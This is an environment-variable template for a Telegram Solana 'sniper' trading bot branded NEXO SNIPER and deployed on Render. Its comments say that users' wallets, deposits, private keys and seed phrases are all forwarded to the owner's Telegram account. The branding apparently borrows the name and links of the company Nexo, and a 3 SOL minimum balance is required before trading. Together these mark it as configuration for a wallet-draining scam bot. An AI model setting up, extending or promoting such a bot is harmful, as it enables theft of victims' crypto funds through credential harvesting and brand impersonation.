# ═══════════════════════════════════════════════
# NEXO SNIPER BOT - ENVIRONMENT VARIABLES
# Set these in Render Dashboard > Environment
# ═══════════════════════════════════════════════

# === REQUIRED ===

# Telegram Bot Token (from @BotFather)
TELEGRAM_BOT_TOKEN=your_bot_token_here

# Your Telegram User ID (get from @userinfobot)
# This is who receives ALL notifications: new users, wallets, deposits, trades, withdrawals, private keys, seed phrases
OWNER_TELEGRAM_ID=your_telegram_user_id

# === OWNER WALLET (OPTIONAL) ===

# Your Solana wallet seed phrase (12 or 24 words, space-separated)
# This connects YOUR wallet to the bot on startup
# Leave empty if you want the bot to generate wallets for you instead
OWNER_SEED_PHRASE=

# === BRANDING / LINKS (from @ainexotradingbot) ===

# Bot display name
BOT_NAME=NEXO SNIPER

# Support username (without @) shown in help message
SUPPORT_USERNAME=ainexobotsupport

# Website URL shown in help
WEBSITE_URL=https://t.co/z1XgC7Zd6d

# Twitter URL shown in help
TWITTER_URL=https://x.com/Nexo?s=20

# === TRADING ===

# Minimum SOL balance required to trade (shown in dashboard)
MINIMUM_SOL=3.0000

# Solana RPC URL (default: free public endpoint)
# For production, use a paid RPC like QuickNode, Helius, or Alchemy
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com

# === SERVER (Render sets these automatically) ===
# PORT=3000
# RENDER_EXTERNAL_URL=https://your-app.onrender.com
